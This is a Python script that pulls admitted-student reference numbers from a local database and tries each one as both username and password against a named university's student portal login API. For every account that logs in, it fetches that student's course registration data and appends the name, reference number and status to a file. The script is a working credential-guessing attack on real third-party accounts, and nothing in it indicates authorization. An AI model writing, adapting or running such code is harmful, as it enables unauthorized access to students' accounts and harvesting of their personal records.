url = "https://student.umat.edu.gh/api/auth/login"
headers = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"99\", \"Google Chrome\";v=\"151\", \"Chromium\";v=\"151\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
}


import mysql.connector, requests
from mysql.connector import Error

def get_reference_numbers():
    try:
        # Establish the connection to the database
        connection = mysql.connector.connect(
            host='localhost',          # Update if your DB is hosted elsewhere
            database='umatdb',         # Your database name
            user='root',      # Replace with your MySQL username
            password=''   # Replace with your MySQL password
        )

        if connection.is_connected():
            cursor = connection.cursor()
            
            # SQL query to select the formReferenceNo column
            query = 'select * from admitted_students;'
            cursor.execute(query)
            
            # Fetch all rows from the executed query
            records = cursor.fetchall()            
            return records

    except Error as e:
        print(f"Error while connecting to MySQL: {e}")

    finally:
        # Ensure the database connection is closed properly
        if 'connection' in locals() and connection.is_connected():
            cursor.close()
            connection.close()
            print("\nMySQL connection is closed.")


records = get_reference_numbers()
for row in records:
    ref = row[1]
    user = row[2]
#make request
    body = {
        "username": ref,
        "password": ref
    }
    with requests.Session() as session:
        res = session.post(url,json=body)
        if res.status_code == 200:
            print("Found ", user)
            print("Checking If user actually reported")
            res2 = session.post("https://student.umat.edu.gh/api/registration",json={"action":"getCourses"})
            print(res2.status_code)
            print(res2.content)
            report_state = "Failed to hit"
            if res2.status_code == 200:
                report_state = "Reported" if len(res2.json()["data"]) !=0 else "Not Reported"
            with open("students.txt", "a") as f:
                f.write(f"{user} ---------- {ref} ------- {report_state}\n")


